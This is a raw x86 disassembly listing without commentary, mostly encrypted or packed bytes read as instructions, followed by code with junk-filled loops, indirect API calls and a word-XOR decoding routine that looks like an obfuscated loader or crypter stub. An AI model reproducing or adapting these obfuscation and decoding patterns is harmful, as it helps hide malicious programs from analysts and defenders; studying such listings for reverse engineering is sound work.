  410b86:	add    DWORD PTR [eax+0x6d],ecx
  410b89:	lock pop ecx
  410b8b:	inc    eax
  410b8c:	mov    dh,0xc1
  410b8e:	xchg   ebx,eax
  410b8f:	xchg   ecx,eax
  410b90:	xor    DWORD PTR [edx-0x2ea7ec98],ecx
  410b96:	int    0x5
  410b98:	add    BYTE PTR [ebx],dl
  410b9a:	or     DWORD PTR [ebx+0x56fdcd44],ebx
  410ba0:	add    eax,0xd033d0a6
  410ba5:	sbb    ch,ah
  410ba7:	imul   ecx,DWORD PTR [edi],0x999ed99c
  410bad:	imul   edi,edx,0xffffffe9
  410bb0:	push   esi
  410bb1:	cmp    ebp,DWORD PTR ds:[esi+0x76]
  410bb5:	daa    
  410bb6:	std    
  410bb7:	xor    DWORD PTR [ebp-0x53],ebp
  410bba:	fldenv [eax*1+0x237e8048]
  410bc1:	test   al,dl
  410bc3:	sub    ah,BYTE PTR [ebx]
  410bc5:	stc    
  410bc6:	add    bh,BYTE PTR [edi-0x7542140a]
  410bcc:	and    eax,0x7fd4b743
  410bd1:	push   esp
  410bd2:	mov    cl,0xc9
  410bd5:	pop    edi
  410bd6:	les    edi,FWORD PTR [ecx]
  410bd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bd9:	out    dx,eax
  410bda:	sbb    eax,0x9e0d1d72
  410bdf:	cmp    al,0x61
  410be1:	xor    DWORD PTR [ecx+0x34],ecx
  410be4:	sbb    esp,edi
  410be6:	loope  0x410c07
  410be8:	gs stos DWORD PTR es:[edi],eax
  410bea:	(bad)  
  410beb:	push   esi
  410bec:	ret    
  410bed:	cmc    
  410bee:	dec    esp
  410bef:	cmp    BYTE PTR [edx],0x70
  410bf2:	jnp    0x410c04
  410bf4:	jg     0x410b89
  410bf6:	dec    esi
  410bf7:	test   BYTE PTR [ecx],dh
  410bf9:	stc    
  410bfa:	push   ds
  410bfb:	(bad)
  410bfe:	rcl    ah,1
  410c00:	arpl   WORD PTR [ebx-0x1b],bx
  410c03:	std    
  410c04:	inc    ebp
  410c05:	mov    ah,0x76
  410c07:	inc    esi
  410c08:	stos   BYTE PTR es:[edi],al
  410c09:	mov    edx,0xfdf8045b
  410c0e:	and    BYTE PTR [ebp+0x1f],bh
  410c11:	push   0x9181dd4b
  410c16:	call   0x74c3:0x29740e7a
  410c1d:	or     ch,BYTE PTR [ebx]
  410c1f:	inc    edi
  410c20:	shl    cl,1
  410c22:	jbe    0x410bde
  410c24:	loop   0x410c66
  410c26:	mov    edx,0xcd74e0e6
  410c2b:	xchg   esi,eax
  410c2c:	hlt    
  410c2d:	pop    es
  410c2e:	inc    edx
  410c2f:	sbb    esi,DWORD PTR [esi+ebx*8+0x7e]
  410c33:	fisubr WORD PTR [ebp+0xc]
  410c36:	enter  0x59bb,0x53
  410c3a:	out    dx,al
  410c3b:	dec    edi
  410c3c:	inc    eax
  410c3d:	in     al,0x16
  410c3f:	and    eax,0x77f1a2f1
  410c44:	test   ebx,edi
  410c46:	imul   ebp,DWORD PTR [ebx],0x72
  410c49:	jmp    0x410bd3
  410c4b:	jmp    0xd04c:0x75ad30de
  410c52:	mov    ah,0xd8
  410c54:	xlat   BYTE PTR ds:[ebx]
  410c55:	icebp  
  410c56:	add    eax,0xdc70ace5
  410c5b:	shl    eax,1
  410c5d:	mov    bl,BYTE PTR [esi+0x17640cf0]
  410c63:	cmp    DWORD PTR [eax-0x79],edx
  410c66:	xor    edi,edx
  410c68:	pop    es
  410c69:	test   BYTE PTR [edi+0x72b9c96c],bl
  410c6f:	(bad)  
  410c71:	or     al,0x4
  410c73:	pop    edi
  410c74:	sub    BYTE PTR [ebx-0x9],0xc1
  410c78:	jb     0x410c8a
  410c7a:	xchg   BYTE PTR [ebx],dh
  410c7c:	mov    eax,ds:0xe6ee6a30
  410c81:	(bad)  
  410c82:	aas    
  410c83:	inc    ebx
  410c84:	arpl   bx,cx
  410c86:	pop    ebx
  410c87:	and    eax,0xd004c946
  410c8c:	xor    esi,ecx
  410c8e:	mov    bh,0x81
  410c90:	inc    esp
  410c91:	add    DWORD PTR [eax],edx
  410c93:	sbb    al,0x7a
  410c95:	cmp    esp,0xab8d23d9
  410c9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c9c:	push   edi
  410c9d:	cmp    al,0x44
  410c9f:	cdq    
  410ca0:	mov    cs,esp
  410ca2:	sahf   
  410ca3:	mov    bl,0x8b
  410ca5:	shl    BYTE PTR [esi*8-0x70b16438],0x76
  410cad:	dec    eax
  410cae:	xor    DWORD PTR [ecx],eax
  410cb0:	mov    eax,ds:0x60b8c8d9
  410cb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cb6:	jmp    0xc303:0x78c2a723
  410cbd:	sbb    al,0xda
  410cbf:	aaa    
  410cc0:	xchg   edi,eax
  410cc1:	lock arpl WORD PTR [ecx],di
  410cc4:	pop    ebx
  410cc5:	pop    esi
  410cc6:	packssdw mm2,QWORD PTR [edx+0x2f892f85]
  410ccd:	push   esp
  410cce:	and    ebp,ebx
  410cd0:	enter  0x9b8a,0x7d
  410cd4:	outs   dx,DWORD PTR ds:[esi]
  410cd5:	mov    ebx,0x1076df68
  410cda:	push   0xfb8adcb8
  410cdf:	(bad)  
  410ce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ce1:	mov    ecx,0xa6e829d2
  410ce6:	mov    ds:0x37cb6d76,eax
  410ceb:	mov    BYTE PTR [eax-0x6448371d],al
  410cf1:	ror    BYTE PTR [esi-0x32ab5301],0x88
  410cf8:	cdq    
  410cf9:	and    bl,BYTE PTR [ebx+0x7c4ee35d]
  410cff:	push   esi
  410d00:	sbb    al,0x38
  410d02:	cdq    
  410d03:	retf   
  410d04:	stos   BYTE PTR es:[edi],al
  410d05:	mov    ebx,0x591b34da
  410d0a:	fisubr WORD PTR [ebp+0x5a]
  410d0d:	(bad)  
  410d0e:	mov    ah,0xe1
  410d10:	adc    al,0x23
  410d12:	sbb    DWORD PTR [esi-0x5fd2fc57],esi
  410d18:	sbb    esi,eax
  410d1a:	aaa    
  410d1b:	into   
  410d1c:	jae    0x410d45
  410d1e:	dec    edx
  410d1f:	arpl   WORD PTR [eax-0x47666a92],cx
  410d25:	mov    ds:0x2f4ee0f0,eax
  410d2a:	dec    esi
  410d2b:	sbb    ch,BYTE PTR [edi-0x58]
  410d2e:	fs push ecx
  410d30:	(bad)  
  410d32:	pop    ss
  410d33:	push   ds
  410d34:	pop    ebx
  410d35:	out    dx,eax
  410d36:	sub    al,0x4f
  410d38:	out    dx,al
  410d39:	test   DWORD PTR [eax-0x22],0x93f74aa4
  410d40:	dec    edx
  410d41:	imul   esp,edi,0x32fb0c21
  410d47:	hlt    
  410d48:	inc    edi
  410d49:	push   esp
  410d4a:	add    DWORD PTR [edi-0x8ee9920],ecx
  410d50:	inc    eax
  410d51:	mov    cl,0xde
  410d53:	adc    edx,DWORD PTR [eax+edx*2]
  410d56:	push   eax
  410d57:	mov    ch,0xa1
  410d59:	aas    
  410d5a:	and    eax,0xe3fb8f4
  410d5f:	ss or  al,0xe8
  410d62:	xor    bl,al
  410d64:	xchg   ebp,eax
  410d65:	jo     0x410d76
  410d67:	pop    ecx
  410d68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d69:	sti    
  410d6a:	das    
  410d6b:	adc    esp,DWORD PTR [ebx+ebx*4]
  410d6e:	out    0x7e,al
  410d70:	xchg   BYTE PTR [edx],ch
  410d72:	push   edx
  410d73:	clc    
  410d74:	pop    ebp
  410d75:	test   DWORD PTR [ecx+0x7da77cd9],esi
  410d7b:	adc    al,0xb7
  410d7d:	jp     0x410d79
  410d7f:	nop
  410d80:	mov    bh,0xde
  410d82:	xchg   BYTE PTR [ebx],dl
  410d84:	or     ebx,DWORD PTR [ebp-0x2d]
  410d87:	sub    al,0x5f
  410d89:	test   ah,0xb6
  410d8c:	inc    edi
  410d8d:	neg    BYTE PTR [edi+0x42]
  410d90:	jae    0x410dcb
  410d92:	inc    ebx
  410d93:	xchg   esp,eax
  410d94:	adc    DWORD PTR [ebp-0x33],esp
  410d97:	cmp    BYTE PTR [eax-0x43],cl
  410d9a:	mov    eax,0xcd8ba036
  410d9f:	sbb    al,0x3f
  410da1:	mov    ds:0xfc3ace32,al
  410da6:	add    BYTE PTR [eax],cl
  410da8:	mov    ebx,0xd84576a9
  410dad:	mov    ebx,0x30ada95d
  410db2:	repnz cmp DWORD PTR [ebx],edx
  410db5:	mov    ebx,0xf2188b61
  410dba:	inc    esi
  410dbb:	je     0x410db2
  410dbd:	das    
  410dbe:	mov    ebx,0x5a9239b8
  410dc3:	mov    ds:0x2dc1693,al
  410dc8:	(bad)  
  410dc9:	fsubr  QWORD PTR [ecx]
  410dcb:	or     edx,DWORD PTR [eax]
  410dcd:	shl    DWORD PTR [ebp+0x6c56c49f],1
  410dd3:	jne    0x410d66
  410dd5:	dec    esi
  410dd6:	fiadd  WORD PTR [ebx+0x18]
  410dd9:	fstp   TBYTE PTR [eax]
  410ddb:	sbb    eax,0x891a4d4
  410de0:	add    eax,0x1bc16e3f
  410de5:	jns    0x410d69
  410de7:	pop    esi
  410de8:	mov    esi,0xe1d4a477
  410ded:	xor    ebx,esp
  410def:	or     DWORD PTR [ebx],esp
  410df1:	stc    
  410df2:	imul   edx,esi,0xd6fee8fd
  410df8:	add    dl,BYTE PTR [esp+ecx*4]
  410dfb:	js     0x410e03
  410dfd:	xor    BYTE PTR [esp+edi*1-0x1c],dl
  410e01:	xchg   ecx,eax
  410e02:	add    al,0x65
  410e04:	xchg   ecx,eax
  410e05:	cwde   
  410e06:	fld    DWORD PTR [edi-0x5a]
  410e09:	lods   al,BYTE PTR ds:[esi]
  410e0a:	mov    dl,0x8
  410e0c:	xlat   BYTE PTR ds:[ebx]
  410e0d:	or     al,0x8d
  410e10:	xor    ebx,DWORD PTR [esi+0x33]
  410e13:	push   ss
  410e14:	out    0xba,al
  410e16:	add    ecx,edi
  410e18:	pop    ds
  410e19:	jl     0x410ddb
  410e1b:	test   al,0xd7
  410e1d:	xchg   edx,eax
  410e1e:	in     al,dx
  410e1f:	stos   BYTE PTR es:[edi],al
  410e20:	nop
  410e21:	mov    esp,0xa8d015b0
  410e26:	les    esp,FWORD PTR [edi]
  410e28:	push   ds
  410e29:	icebp  
  410e2a:	sbb    DWORD PTR [edi],esp
  410e2c:	dec    esi
  410e2d:	pop    ebp
  410e2e:	aaa    
  410e2f:	shl    BYTE PTR [edi+0x34],cl
  410e32:	fwait
  410e33:	das    
  410e34:	dec    esp
  410e35:	sub    edi,ecx
  410e37:	retf   0x4468
  410e3a:	ret    0x2900
  410e3d:	jge    0x410e4d
  410e3f:	popf   
  410e40:	stc    
  410e41:	pop    ebp
  410e42:	aaa    
  410e43:	inc    ebx
  410e44:	xor    BYTE PTR [ebp+ebx*1-0x144ec9bb],ah
  410e4b:	icebp  
  410e4c:	push   0xffffffb7
  410e4e:	dec    eax
  410e4f:	aas    
  410e50:	dec    esp
  410e51:	ret    0x8ac0
  410e54:	not    DWORD PTR [eax+0x18ab4f81]
  410e5a:	aas    
  410e5b:	stos   DWORD PTR es:[edi],eax
  410e5c:	es push edx
  410e5e:	adc    al,0x1
  410e60:	or     eax,DWORD PTR [ebx-0x6e9e07d5]
  410e66:	mov    esi,0xd66f3016
  410e6b:	xchg   DWORD PTR [ebx+0x0],ebx
  410e6e:	outs   dx,DWORD PTR ds:[esi]
  410e6f:	aas    
  410e70:	dec    eax
  410e71:	add    bl,ch
  410e73:	je     0x410e89
  410e75:	retf   
  410e76:	pop    edx
  410e77:	lock dec edx
  410e79:	fist   DWORD PTR [ebp+0x5]
  410e7c:	in     al,dx
  410e7d:	jae    0x410e3c
  410e7f:	(bad)  
  410e81:	daa    
  410e82:	aam    0x60
  410e84:	sti    
  410e85:	sub    eax,0x1aa5dcb0
  410e8a:	call   0xc92944ef
  410e8f:	and    ebx,DWORD PTR [edx-0x6dc5288a]
  410e95:	test   ch,dl
  410e97:	mov    ebp,DWORD PTR [edi-0x194f7a6b]
  410e9d:	dec    eax
  410e9e:	(bad)  
  410e9f:	fbld   TBYTE PTR [edx]
  410ea1:	js     0xe73c720a
  410ea7:	daa    
  410ea8:	cmc    
  410ea9:	jmp    0x410ea0
  410eab:	xor    BYTE PTR ds:0x16a49e9b,cl
  410eb1:	add    al,BYTE PTR [ebx+0x2a097df6]
  410eb7:	retf   
  410eb8:	addr16 cmp eax,0xfcacb480
  410ebe:	cmp    eax,0x777b357a
  410ec3:	inc    eax
  410ec4:	add    esi,0x8b71f391
  410eca:	sahf   
  410ecb:	adc    ebx,DWORD PTR [esi]
  410ecd:	(bad)  
  410ece:	fsubr  QWORD PTR [ecx+0x7d]
  410ed1:	jo     0x410e7f
  410ed3:	cmp    ebp,DWORD PTR [ecx+0x69495905]
  410ed9:	xchg   DWORD PTR [edx+0x15f66136],ebx
  410edf:	(bad)  
  410ee0:	daa    
  410ee1:	sbb    bh,ch
  410ee3:	cmp    DWORD PTR [ebx+edi*1+0xb],eax
  410ee7:	mov    edx,0x445653f
  410eec:	dec    esp
  410eed:	mul    BYTE PTR [ebx]
  410eef:	jno    0x410f06
  410ef1:	xlat   BYTE PTR ds:[ebx]
  410ef2:	call   0x69c6:0xdcb3
  410ef8:	icebp  
  410ef9:	pop    esi
  410efa:	pop    es
  410efb:	mov    al,0x60
  410efd:	jno    0x410f13
  410eff:	mov    bh,0xf
  410f01:	cmp    al,0xbe
  410f03:	call   0x75cc:0xbe51eb7c
  410f0a:	neg    DWORD PTR [edx+0x32348f02]
  410f10:	(bad)
  410f14:	cmp    DWORD PTR [ebp+0x2fab480b],ebp
  410f1a:	sbb    DWORD PTR [ecx+0x4b],ebx
  410f1d:	sub    edx,esi
  410f1f:	rcl    BYTE PTR [ebx+ecx*1],cl
  410f22:	jno    0x410f18
  410f24:	test   eax,0xbf9c5531
  410f29:	out    0x8a,eax
  410f2b:	and    ebp,DWORD PTR [edi-0x52cee1ce]
  410f31:	mov    edx,0xb266c5ee
  410f36:	push   edx
  410f37:	sub    BYTE PTR [ebp+0x32e7975f],0x3f
  410f3e:	jns    0x410f34
  410f40:	push   0xffffffa1
  410f42:	das    
  410f43:	gs ret 0x3e25
  410f47:	mov    ds:0xf855425,eax
  410f4c:	pop    ecx
  410f4d:	mov    ah,0x48
  410f4f:	dec    esi
  410f50:	mov    BYTE PTR [esi+edi*8],ah
  410f53:	hlt    
  410f54:	pop    es
  410f55:	jge    0x410ee3
  410f57:	and    dh,al
  410f59:	xor    eax,0xa5dda641
  410f5e:	mov    ebx,0x86560721
  410f63:	cmc    
  410f64:	(bad)  
  410f66:	mov    edi,0x2e42cd3a
  410f6b:	mov    WORD PTR [edi-0x1b763d09],fs
  410f71:	xlat   BYTE PTR ds:[ebx]
  410f72:	retf   0x7dbe
  410f75:	outs   dx,DWORD PTR ds:[esi]
  410f76:	cdq    
  410f77:	fstp   TBYTE PTR [ebx-0x62]
  410f7a:	push   ds
  410f7b:	popf   
  410f7c:	inc    ebp
  410f7d:	into   
  410f7e:	sub    bl,BYTE PTR [eax+0x1c98eb28]
  410f84:	and    BYTE PTR [ebx-0x3],ah
  410f87:	mov    dl,0x6f
  410f89:	inc    ebp
  410f8a:	in     al,0x41
  410f8c:	enter  0x368c,0xe0
  410f90:	cmp    BYTE PTR [ebp-0x29],ah
  410f93:	test   DWORD PTR ds:0x63c82735,eax
  410f99:	jmp    0x411012
  410f9b:	jecxz  0x410fa5
  410f9d:	loop   0x410fbf
  410f9f:	shl    esi,0x62
  410fa2:	clc    
  410fa3:	jmp    0xd3c:0x3c7fc76c
  410faa:	aas    
  410fab:	jb     0x411003
  410fad:	shr    cl,1
  410faf:	xchg   esi,eax
  410fb0:	(bad)  
  410fb1:	sbb    eax,0x5b99a211
  410fb6:	outs   dx,BYTE PTR ds:[esi]
  410fb7:	retf   0x9847
  410fba:	cmp    BYTE PTR [ebx-0x7c],dl
  410fbd:	mov    al,ds:0x447c87fb
  410fc2:	push   ebx
  410fc3:	sahf   
  410fc4:	inc    edx
  410fc5:	scas   al,BYTE PTR es:[edi]
  410fc6:	in     al,dx
  410fc7:	xchg   ebp,eax
  410fc8:	(bad)  
  410fc9:	pop    ebx
  410fca:	div    BYTE PTR [ebx]
  410fcc:	xchg   esp,eax
  410fcd:	adc    bl,BYTE PTR [ebp-0x3e]
  410fd0:	in     al,dx
  410fd1:	gs in  al,0x1c
  410fd4:	das    
  410fd5:	mov    esi,0x63e5aec9
  410fda:	xor    eax,0x23ad0c66
  410fdf:	inc    ecx
  410fe0:	jp     0x41102f
  410fe2:	inc    ebx
  410fe3:	jmp    0x6c39:0xbadc8e4f
  410fea:	(bad)  
  410feb:	pop    edi
  410fec:	or     DWORD PTR [ebx+0x26],0xcd6c7019
  410ff3:	push   ds
  410ff4:	popa   
  410ff5:	dec    ebp
  410ff6:	aam    0x8a
  410ff8:	pop    eax
  410ff9:	retf   
  410ffa:	ret    0x90af
  410ffd:	cmp    esp,edx
  410fff:	pop    ebp
  411000:	out    dx,eax
  411001:	call   0xe6521df8
  411006:	adc    eax,0x58b4fad5
  41100b:	sub    DWORD PTR fs:[esi-0x1d],ebp
  41100f:	cs inc ebx
  411011:	jecxz  0x410fb8
  411013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411014:	les    eax,FWORD PTR [ebx]
  411016:	jmp    0xe4fc:0x98dfe039
  41101d:	sub    ah,ch
  41101f:	(bad)  
  411021:	sub    DWORD PTR [ebp+0xb],eax
  411024:	mov    ecx,DWORD PTR [ebp+0x8]
  411027:	mov    eax,0x8a8d
  41102c:	xor    ax,WORD PTR [ecx+0x20]
  411030:	adc    DWORD PTR ds:0x42b000,0x1520
  41103a:	mov    ecx,0x3b51
  41103f:	or     DWORD PTR ds:0x42a008,0x52f2
  411049:	add    ax,cx
  41104c:	or     DWORD PTR ds:0x42c010,ebx
  411052:	movzx  eax,ax
  411055:	mov    DWORD PTR [ebp-0x10],eax
  411058:	xor    DWORD PTR ds:0x429020,ecx
  41105e:	mov    BYTE PTR [ebp-0x1],0x7d
  411062:	lea    eax,[ebp-0x1]
  411065:	and    ecx,DWORD PTR ds:0x429024
  41106b:	mov    DWORD PTR [ebp-0xc],eax
  41106e:	mov    al,BYTE PTR [ebp-0x1]
  411071:	mov    ecx,DWORD PTR [ebp-0xc]
  411074:	xor    DWORD PTR ds:0x42d014,0x42a010
  41107e:	xor    al,0x74
  411080:	sub    al,0x8
  411082:	add    DWORD PTR ds:0x42901c,0x5bfc
  41108c:	mov    BYTE PTR [ecx],al
  41108e:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  411095:	and    DWORD PTR ds:0x42d004,0x0
  41109f:	jmp    0x4110b3
  4110a4:	xor    ecx,ecx
  4110a6:	add    ecx,DWORD PTR ds:0x42d004
  4110ac:	inc    ecx
  4110ad:	mov    DWORD PTR ds:0x42d004,ecx
  4110b3:	cmp    DWORD PTR ds:0x42d004,0x1a
  4110ba:	jae    0x4110fe
  4110c0:	cmp    DWORD PTR ds:0x42d004,0x5
  4110c7:	jne    0x4110d3
  4110cd:	call   DWORD PTR ds:0x42e8f3
  4110d3:	cmp    DWORD PTR ds:0x42d004,0x4
  4110da:	jne    0x4110ef
  4110e0:	xor    ecx,ecx
  4110e2:	xor    ecx,DWORD PTR ds:0x42d004
  4110e8:	inc    ecx
  4110e9:	mov    DWORD PTR ds:0x42d004,ecx
  4110ef:	jmp    0x4110a4
  4110f4:	mov    DWORD PTR ds:0x42901c,0x6887
  4110fe:	push   ebx
  4110ff:	and    DWORD PTR ds:0x42c008,0x0
  411109:	jmp    0x411119
  41110e:	mov    eax,ds:0x42c008
  411113:	inc    eax
  411114:	mov    ds:0x42c008,eax
  411119:	cmp    DWORD PTR ds:0x42c008,0x19
  411120:	jae    0x4111a1
  411126:	cmp    DWORD PTR ds:0x42c008,0x5
  41112d:	jne    0x41113e
  411133:	push   0x42e000
  411138:	call   DWORD PTR ds:0x42e8f7
  41113e:	cmp    DWORD PTR ds:0x42c008,0x4
  411145:	jne    0x411156
  41114b:	mov    eax,ds:0x42c008
  411150:	inc    eax
  411151:	mov    ds:0x42c008,eax
  411156:	jmp    0x41110e
  41115b:	and    DWORD PTR ds:0x429024,0x0
  411165:	mov    ecx,DWORD PTR ds:0x429024
  41116b:	inc    ecx
  41116c:	mov    DWORD PTR ds:0x429024,ecx
  411172:	cmp    DWORD PTR ds:0x429024,0x21
  411179:	jne    0x411192
  41117f:	push   DWORD PTR [ebp-0x14]
  411182:	push   0x42d018
  411187:	push   0x6b2d
  41118c:	call   DWORD PTR ds:0x42e8bf
  411192:	cmp    DWORD PTR ds:0x429024,0x17
  411199:	jb     0x411165
  41119f:	xor    eax,eax
  4111a1:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4111a8:	and    DWORD PTR ds:0x42a008,0x0
  4111b2:	jmp    0x4111c5
  4111b7:	xor    eax,eax
  4111b9:	or     eax,DWORD PTR ds:0x42a008
  4111bf:	inc    eax
  4111c0:	mov    ds:0x42a008,eax
  4111c5:	cmp    DWORD PTR ds:0x42a008,0x14
  4111cc:	jae    0x41120d
  4111d2:	cmp    DWORD PTR ds:0x42a008,0x5
  4111d9:	jne    0x4111ea
  4111df:	push   0x42e067
  4111e4:	call   DWORD PTR ds:0x42e8fb
  4111ea:	cmp    DWORD PTR ds:0x42a008,0x4
  4111f1:	jne    0x411202
  4111f7:	mov    eax,ds:0x42a008
  4111fc:	inc    eax
  4111fd:	mov    ds:0x42a008,eax
  411202:	jmp    0x4111b7
  411207:	xor    DWORD PTR ds:0x42a018,edx
  41120d:	mov    ecx,DWORD PTR [ebp-0x18]
  411210:	dec    DWORD PTR ds:0x42a010
  411216:	push   esi
  411217:	mov    eax,0x751089b
  41121c:	mov    esi,DWORD PTR ds:0x41cda1
  411222:	mov    esi,DWORD PTR [esi]
  411224:	sub    DWORD PTR ds:0x429028,esi
  41122a:	xor    ecx,eax
  41122c:	inc    esi
  41122d:	mov    esi,0x3272e2
  411232:	add    DWORD PTR ds:0x42b008,0x42d010
  41123c:	push   edi
  41123d:	or     DWORD PTR ds:0x42b004,0x429028
  411247:	add    ecx,esi
  411249:	jmp    0x411277
  41124e:	mov    DWORD PTR ds:0x42c00c,0x285a
  411258:	mov    dl,BYTE PTR [ebp-0x1]
  41125b:	mov    DWORD PTR ds:0x42a00c,0x78fc
  411265:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41126c:	mov    DWORD PTR ds:0x429024,0x3f09
  411276:	inc    ecx
  411277:	mov    DWORD PTR ds:0x42a00c,0x5b6f
  411281:	cmp    ecx,0x40
  411284:	mov    DWORD PTR ds:0x42d01c,0x4c47
  41128e:	jb     0x41124e
  411294:	mov    edx,DWORD PTR [ebp-0x18]
  411297:	xor    edx,eax
  411299:	add    edx,esi
  41129b:	jmp    0x41130b
  4112a0:	sub    edi,ecx
  4112a2:	mov    edi,DWORD PTR [ebp+0x8]
  4112a5:	add    ecx,0x4f49
  4112ab:	mov    ecx,0x8a8d
  4112b0:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4112b5:	sub    edi,DWORD PTR ds:0x42b00c
  4112bb:	mov    edi,0x3b51
  4112c0:	xor    DWORD PTR ds:0x42c01c,0x429014
  4112ca:	add    cx,di
  4112cd:	movzx  ecx,cx
  4112d0:	mov    DWORD PTR [ebp-0xc],ecx
  4112d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d6:	sbb    DWORD PTR ds:0x42b000,0x42d008
  4112e0:	movzx  ecx,WORD PTR [ecx+edx*4]
  4112e4:	xor    ecx,0x8a8d
  4112ea:	adc    DWORD PTR ds:0x42b014,0x42b008
  4112f4:	add    ecx,edi
  4112f6:	mov    edi,DWORD PTR [ebp-0xc]
  4112f9:	mov    DWORD PTR ds:0x42b018,0x62b9
  411303:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41130a:	inc    edx
  41130b:	mov    ecx,DWORD PTR [ebp-0x10]
  41130e:	mov    DWORD PTR ds:0x42a00c,0x6d31
  411318:	cmp    edx,ecx
  41131a:	mov    DWORD PTR ds:0x429018,0x5128
  411324:	jne    0x4112a0
  41132a:	mov    DWORD PTR ds:0x42c018,0x17
  411334:	cmp    DWORD PTR ds:0x42c018,0x0
  41133b:	je     0x411388
  411341:	cmp    DWORD PTR ds:0x42c018,0x8
  411348:	jne    0x411354
  41134e:	call   DWORD PTR ds:0x42e8ff
  411354:	cmp    DWORD PTR ds:0x42c018,0x9
  41135b:	jne    0x411370
  411361:	xor    edx,edx
  411363:	add    edx,DWORD PTR ds:0x42c018
  411369:	dec    edx
  41136a:	mov    DWORD PTR ds:0x42c018,edx
  411370:	mov    edx,DWORD PTR ds:0x42c018
  411376:	dec    edx
  411377:	mov    DWORD PTR ds:0x42c018,edx
  41137d:	jmp    0x411334
  411382:	adc    ecx,0x40c
  411388:	mov    ecx,DWORD PTR [ebp-0x18]
  41138b:	or     edi,edi
  41138d:	mov    edx,DWORD PTR [ebp+0x10]
  411390:	neg    edi
  411392:	xor    ecx,eax
  411394:	add    DWORD PTR ds:0x42b01c,ebx
  41139a:	add    ecx,esi
  41139c:	mov    DWORD PTR [edx],ecx
  41139e:	and    DWORD PTR ds:0x42b014,0x0
  4113a8:	mov    ecx,DWORD PTR ds:0x42b014
  4113ae:	inc    ecx
  4113af:	mov    DWORD PTR ds:0x42b014,ecx
  4113b5:	cmp    DWORD PTR ds:0x42b014,0x4
  4113bc:	jne    0x4113d5
  4113c2:	push   0x44ec
  4113c7:	push   0x42901c
  4113cc:	push   DWORD PTR [ebp-0x18]
  4113cf:	call   DWORD PTR ds:0x42e903
  4113d5:	cmp    DWORD PTR ds:0x42b014,0x3
  4113dc:	jne    0x4113ef
  4113e2:	mov    ecx,DWORD PTR ds:0x42b014
  4113e8:	inc    ecx
  4113e9:	mov    DWORD PTR ds:0x42b014,ecx
  4113ef:	cmp    DWORD PTR ds:0x42b014,0x13
  4113f6:	jb     0x4113a8
  4113fc:	or     edi,edi
  4113fe:	mov    ecx,DWORD PTR [ebp-0x18]
  411401:	xor    ecx,eax
  411403:	sbb    DWORD PTR ds:0x429004,0x2443
  41140d:	add    ecx,esi
  41140f:	mov    DWORD PTR [ebp-0xc],ecx
  411412:	mov    DWORD PTR [ebp+0x8],0xf89c8585
  411419:	mov    DWORD PTR ds:0x429014,0x17
  411423:	cmp    DWORD PTR ds:0x429014,0x0
  41142a:	je     0x411491
  411430:	cmp    DWORD PTR ds:0x429014,0xb
  411437:	jne    0x411450
  41143d:	push   0x0
  41143f:	push   DWORD PTR [ebp-0x1c]
  411442:	push   0x533d
  411447:	push   DWORD PTR [ebp-0x10]
  41144a:	call   DWORD PTR ds:0x42e8c3
  411450:	cmp    DWORD PTR ds:0x429014,0xc
  411457:	jne    0x41146c
  41145d:	xor    ecx,ecx
  41145f:	or     ecx,DWORD PTR ds:0x429014
  411465:	dec    ecx
  411466:	mov    DWORD PTR ds:0x429014,ecx
  41146c:	mov    ecx,DWORD PTR ds:0x429014
  411472:	dec    ecx
  411473:	mov    DWORD PTR ds:0x429014,ecx
  411479:	jmp    0x411423
  41147e:	xor    edi,edi
  411480:	xor    edi,DWORD PTR ds:0x41cddc
  411486:	mov    ecx,DWORD PTR ds:0x41cd75
  41148c:	sub    ecx,edi
  41148e:	or     edi,DWORD PTR [edi+ecx*1]
  411491:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  411498:	mov    DWORD PTR [ebp-0x10],0xf89c9585
  41149f:	and    DWORD PTR ds:0x42d00c,0x0
  4114a9:	mov    ecx,DWORD PTR ds:0x42d00c
  4114af:	inc    ecx
  4114b0:	mov    DWORD PTR ds:0x42d00c,ecx
  4114b6:	cmp    DWORD PTR ds:0x42d00c,0x10
  4114bd:	jne    0x4114d5
  4114c3:	push   DWORD PTR [ebp-0xc]
  4114c6:	push   DWORD PTR [ebp-0x1c]
  4114c9:	push   DWORD PTR [ebp-0xc]
  4114cc:	push   DWORD PTR [ebp-0x10]
  4114cf:	call   DWORD PTR ds:0x42e8c7
  4114d5:	cmp    DWORD PTR ds:0x42d00c,0xf
  4114dc:	jne    0x4114ef
  4114e2:	mov    ecx,DWORD PTR ds:0x42d00c
  4114e8:	inc    ecx
  4114e9:	mov    DWORD PTR ds:0x42d00c,ecx
  4114ef:	cmp    DWORD PTR ds:0x42d00c,0x1c
  4114f6:	jb     0x4114a9
  4114fc:	mov    ecx,DWORD PTR [ebp-0x14]
  4114ff:	mov    DWORD PTR [ebp+0x8],ecx
  411502:	mov    ecx,DWORD PTR [ebp+0x8]
  411505:	mov    DWORD PTR ds:0x42d008,0x14
  41150f:	cmp    DWORD PTR ds:0x42d008,0x0
  411516:	je     0x411548
  41151c:	cmp    DWORD PTR ds:0x42d008,0x16
  411523:	jne    0x411534
  411529:	push   0x7bbf
  41152e:	call   DWORD PTR ds:0x42e8cb
  411534:	xor    edi,edi
  411536:	add    edi,DWORD PTR ds:0x42d008
  41153c:	dec    edi
  41153d:	mov    DWORD PTR ds:0x42d008,edi
  411543:	jmp    0x41150f
  411548:	xor    ecx,eax
  41154a:	movzx  edi,BYTE PTR ds:0x429004
  411551:	sub    edi,DWORD PTR ds:0x429014
  411557:	mov    DWORD PTR ds:0x429004,edi
  41155d:	add    ecx,esi
  41155f:	mov    DWORD PTR ds:0x42c008,0x216c
  411569:	mov    ecx,0x242ebe9
  41156e:	mov    edi,0x5a28
  411573:	mov    edi,0xf641bea
  411578:	je     0x41cc2e
  41157e:	or     DWORD PTR ds:0x42a018,0xc8d
  411588:	mov    edx,DWORD PTR [ebp+0x8]
